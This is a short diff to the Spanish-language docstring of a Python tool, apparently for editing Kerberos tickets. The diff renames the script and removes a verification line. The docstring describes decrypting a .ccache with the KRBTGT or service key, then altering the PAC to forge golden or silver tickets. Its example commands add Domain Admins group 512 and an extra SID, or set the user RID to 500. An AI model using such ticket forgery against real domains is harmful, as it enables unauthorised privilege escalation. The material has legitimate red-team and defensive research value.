@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 """
-edit_ticket.py  --  modifica un ticket Kerberos EXISTENTE in situ
+edittgt.py  --  modifica un ticket Kerberos EXISTENTE in situ
 
 Herramienta AUTONOMA (solo necesita pycryptodome). Abre un .ccache, lo
 descifra con su clave, cambia SOLO los campos que indiques en el PAC_LOGON_INFO
@@ -11,14 +11,11 @@ re-cifra con la MISMA clave y etype, y reescribe el .ccache.
 (KRBTGT para un golden, o la de servicio para un silver).
 
   # añadir Domain Admins y un extra-SID, conservando el resto
-  python3 edit_ticket.py admin.ccache -k <key> \\
-      --add-groups 512 --add-extra-sids S-1-5-21-10-20-30-519
+  python3 edittgt.py admin.ccache -k <key> --add-groups 512 --add-extra-sids S-1-5-21-10-20-30-519
 
   # cambiar el RID del usuario dejando intactos tiempos/flags/clave de sesion
-  python3 edit_ticket.py admin.ccache -k <key> --user-id 500 -o editado.ccache
+  python3 edittgt.py admin.ccache -k <key> --user-id 500 -o editado.ccache
 
-Verificacion (round-trip):
-  python3 view_ticket.py editado.ccache -k <misma_key>
 """
 
 import argparse
